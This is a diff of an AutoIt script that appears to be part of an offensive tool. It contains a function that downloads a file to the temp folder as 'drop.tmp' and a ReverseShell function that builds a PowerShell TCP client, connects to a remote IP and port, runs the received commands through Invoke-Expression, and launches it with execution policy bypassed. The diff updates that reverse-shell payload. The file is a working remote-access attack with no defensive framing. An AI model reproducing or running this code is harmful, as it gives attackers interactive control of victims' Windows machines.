@@ -5,9 +5,9 @@ Func HttpDownloadFile($sURL, $FileName = @TempDir & "\drop.tmp")
    InetGet($sURL, $FileName, 1, 1)
 EndFunc
 
-;reverse shell using powershell - to be review
+;reverse shell using powershell
 Func ReverseShell($RemoteIp, $RemotePort)
-   $buffer = "$client = New-Object System.Net.Sockets.TCPClient(" & $RemoteIp & ", " & $RemotePort & ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
+   $buffer = "$client = [System.Net.Sockets.TCPClient]::new('" & $RemoteIp & "'," & $RemotePort & ");[byte[]]$bytes = (0..65535).ForEach{ 0 };$stream = $client.GetStream();while ($i = $stream.Read($bytes, 0, $bytes.Length)) {$data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i);$sendback = (Invoke-Expression -Command $data 2>&1 | Out-String);$prompt = $sendback + 'PS ' + $PWD.Path + '> ';$sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($prompt);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush()};$client.Close()"
    RunWait("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -exec bypass -c " & " " & $buffer);
 EndFunc
 
